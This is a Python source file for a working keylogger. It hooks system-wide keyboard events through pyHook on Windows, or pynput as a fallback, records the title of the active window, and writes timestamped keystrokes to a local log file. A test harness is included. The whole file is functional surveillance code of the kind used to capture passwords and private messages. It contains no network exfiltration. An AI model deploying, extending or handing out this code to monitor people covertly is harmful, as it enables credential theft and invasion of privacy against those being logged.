import os
import threading
import time
import json
from datetime import datetime

import win32gui
import pythoncom
import pyHook
from pynput import keyboard


class KeyLogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.log_buffer = []
        self.is_running = False
        self.thread = None
        
        # Ensure log file exists
        if not os.path.exists(self.log_file):
            with open(self.log_file, 'w') as f:
                f.write("Keylogger started at {0}\n".format(datetime.now()))
                f.write("=" * 50 + "\n")
    
    def log_keystroke(self, key_data):
        """Log keystroke to buffer and file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = "[{0}] {1}\n".format(timestamp, key_data)
        
        # Add to buffer
        self.log_buffer.append(log_entry)
        
        # Write to file
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_entry)
                f.flush()
        except Exception as e:
            print("Error writing to log file: {0}".format(e))
    
    def get_window_title(self):
        """Get the title of the currently active window"""
        try:
            window = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(window)
            return title if title else "Unknown Window"
        except ImportError:
            return "Active Window"
        except Exception:
            return "Unknown Window"
    
    def log_window_change(self, title):
        """Log when user switches to a different window"""
        self.log_keystroke("--- WINDOW CHANGED: {0} ---".format(title))


class WindowsKeyLogger(KeyLogger):
    """Windows-specific keylogger using pyHook"""
    
    def __init__(self, log_file="keylog.txt"):
        super().__init__(log_file)
        self.current_window = ""
        self.shift_pressed = False
        self.caps_lock = False
    
    def OnKeyboardEvent(self, event):
        """Handle keyboard events"""
        try:
            # Check for window changes
            current_window = self.get_window_title()
            if current_window != self.current_window:
                self.current_window = current_window
                self.log_window_change(current_window)
            
            # Handle special keys
            key_name = self.get_key_name(event)
            
            # Track shift and caps lock state
            if event.Key == 'Lshift' or event.Key == 'Rshift':
                self.shift_pressed = True
            
            # Log the keystroke
            if len(key_name) == 1:  # Regular character
                self.log_keystroke(key_name)
            else:  # Special key
                self.log_keystroke("[{0}]".format(key_name))
                
        except Exception as e:
            self.log_keystroke("[ERROR: {0}]".format(str(e)))
        
        return True  # Allow the event to propagate
    
    def OnKeyboardEventUp(self, event):
        """Handle key release events"""
        if event.Key == 'Lshift' or event.Key == 'Rshift':
            self.shift_pressed = False
        return True
    
    def get_key_name(self, event):
        """Convert key event to readable string"""
        key_map = {
            'Return': '\n',
            'Tab': '\t',
            'Space': ' ',
            'Back': '[BACKSPACE]',
            'Delete': '[DELETE]',
            'Home': '[HOME]',
            'End': '[END]',
            'Prior': '[PAGE_UP]',
            'Next': '[PAGE_DOWN]',
            'Up': '[UP_ARROW]',
            'Down': '[DOWN_ARROW]',
            'Left': '[LEFT_ARROW]',
            'Right': '[RIGHT_ARROW]',
            'Escape': '[ESC]',
            'F1': '[F1]', 'F2': '[F2]', 'F3': '[F3]', 'F4': '[F4]',
            'F5': '[F5]', 'F6': '[F6]', 'F7': '[F7]', 'F8': '[F8]',
            'F9': '[F9]', 'F10': '[F10]', 'F11': '[F11]', 'F12': '[F12]',
            'Lcontrol': '[CTRL]', 'Rcontrol': '[CTRL]',
            'Lmenu': '[ALT]', 'Rmenu': '[ALT]',
            'Lwin': '[WIN]', 'Rwin': '[WIN]',
            'Capital': '[CAPS_LOCK]',
            'Numlock': '[NUM_LOCK]',
            'Scroll': '[SCROLL_LOCK]',
            'Insert': '[INSERT]',
            'Print': '[PRINT_SCREEN]',
            'Pause': '[PAUSE]'
        }
        
        key = event.Key
        
        # Check if it's a special key
        if key in key_map:
            return key_map[key]
        
        # Handle regular characters
        if hasattr(event, 'Ascii') and 32 <= event.Ascii <= 126:
            char = chr(event.Ascii)
            return char
        
        return "[{0}]".format(key)
    
    def start(self):
        """Start the keylogger"""
        if self.is_running:
            return False
        
        self.is_running = True
        self.log_keystroke("=== KEYLOGGER STARTED ===")
        
        def keylogger_thread():
            try:
                # Create hook manager
                hm = pyHook.HookManager()
                hm.KeyDown = self.OnKeyboardEvent
                hm.KeyUp = self.OnKeyboardEventUp
                hm.HookKeyboard()
                
                # Start message pump
                pythoncom.PumpMessages()
                
            except Exception as e:
                self.log_keystroke("[KEYLOGGER ERROR: {0}]".format(str(e)))
        
        self.thread = threading.Thread(target=keylogger_thread, daemon=True)
        self.thread.start()
        return True
    
    def stop(self):
        """Stop the keylogger"""
        if not self.is_running:
            return False
        
        self.is_running = False
        self.log_keystroke("=== KEYLOGGER STOPPED ===")
        
        try:
            # Unhook keyboard
            pythoncom.PostQuitMessage(0)
        except:
            pass
        
        return True


class CrossPlatformKeyLogger(KeyLogger):
    """Cross-platform keylogger using pynput (fallback)"""
    
    def __init__(self, log_file="keylog.txt"):
        super().__init__(log_file)
        self.listener = None
    
    def on_press(self, key):
        """Handle key press events"""
        try:
            # Regular alphanumeric keys
            if hasattr(key, 'char') and key.char:
                self.log_keystroke(key.char)
            else:
                # Special keys
                key_name = str(key).replace('Key.', '')
                self.log_keystroke("[{0}]".format(key_name.upper()))
                
        except Exception as e:
            self.log_keystroke("[ERROR: {0}]".format(str(e)))
    
    def on_release(self, key):
        """Handle key release events"""
        # Stop listener if ESC is pressed (for testing)
        if key == keyboard.Key.esc and not self.is_running:
            return False
    
    def start(self):
        """Start the keylogger"""
        if self.is_running:
            return False
        
        self.is_running = True
        self.log_keystroke("=== KEYLOGGER STARTED (Cross-Platform) ===")
        
        try:
            self.listener = keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
            )
            self.listener.daemon = True
            self.listener.start()
            return True
        except Exception as e:
            self.log_keystroke("[KEYLOGGER START ERROR: {0}]".format(str(e)))
            return False
    
    def stop(self):
        """Stop the keylogger"""
        if not self.is_running:
            return False
        
        self.is_running = False
        self.log_keystroke("=== KEYLOGGER STOPPED ===")
        
        try:
            if self.listener:
                self.listener.stop()
        except:
            pass
        
        return True


def create_keylogger(log_file="keylog.txt"):
    """Factory function to create appropriate keylogger"""
    try:
        return WindowsKeyLogger(log_file)
    except ImportError:
        return CrossPlatformKeyLogger(log_file)


# Test the keylogger (for standalone testing)
if __name__ == "__main__":
    print("Testing keylogger...")
    keylogger = create_keylogger("test_keylog.txt")
    
    if keylogger.start():
        print("Keylogger started. Type something and press Ctrl+C to stop...")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            keylogger.stop()
            print("\nKeylogger stopped.")
            
            # Show logged keys
            try:
                with open("test_keylog.txt", 'r') as f:
                    print("\nLogged keystrokes:")
                    print(f.read())
            except:
                print("Could not read log file.")
    else:
        print("Failed to start keylogger.")